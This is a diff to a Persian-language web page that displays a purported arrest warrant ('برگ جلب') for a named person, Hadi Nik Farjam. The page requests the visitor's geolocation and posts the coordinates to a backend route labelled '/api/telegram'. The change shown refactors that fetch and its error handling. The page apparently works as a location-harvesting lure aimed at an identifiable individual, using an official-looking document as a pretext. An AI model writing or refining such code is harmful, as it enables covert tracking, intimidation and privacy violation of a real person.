@@ -31,7 +31,6 @@
 
   <p id="status">⏳ در حال دریافت موقعیت مکانی...</p>
 
-  <!-- تصویر برگ جلب -->
   <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>
 
   <script>
@@ -50,35 +49,47 @@
       };
 
       navigator.geolocation.getCurrentPosition(
-        position => {
+        async position => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
           status.innerText = "⏳ در حال ثبت اطلاعات...";
 
-          // ارسال درخواست به بک‌اند (مسیر API سرور خودتان)
-          fetch('/api/telegram', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              title: "برگه جلب هادی نیک فرجام",
-              latitude: lat,
-              longitude: lon
-            })
-          })
-          .then(response => response.json())
-          .then(data => {
-            if (data.status === "sent") {
+          try {
+            // نکته: اگر مسیر API شما متفاوت است، آدرس زیر را اصلاح کنید
+            // برای Next.js مسیر معمولاً '/api/telegram' است
+            const response = await fetch('/api/telegram', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                title: "برگه جلب هادی نیک فرجام",
+                latitude: lat,
+                longitude: lon
+              })
+            });
+
+            // بررسی متن پاسخ قبل از پارس کردن به JSON
+            const textResponse = await response.text();
+            let data;
+            
+            try {
+              data = JSON.parse(textResponse);
+            } catch (e) {
+              status.innerText = `❌ پاسخ سرور JSON نبود (کد ${response.status}): ${textResponse.slice(0, 100)}`;
+              return;
+            }
+
+            if (response.ok && data.status === "sent") {
               status.innerText = "✅ جلب متهم هادی نیک فرجام ثبت شد!";
             } else {
-              status.innerText = `❌ خطای سرور: ${data.error || 'ناشناخته'}`;
+              status.innerText = `❌ خطای تلگرام/سرور: ${data.error || data.details || 'نامشخص'}`;
             }
-          })
-          .catch(error => {
-            status.innerText = `❌ خطای ارتباط با بک‌اند: ${error.message}`;
-          });
+
+          } catch (error) {
+            status.innerText = `❌ خطای شبکه: ${error.message}`;
+          }
         },
         error => {
           switch (error.code) {
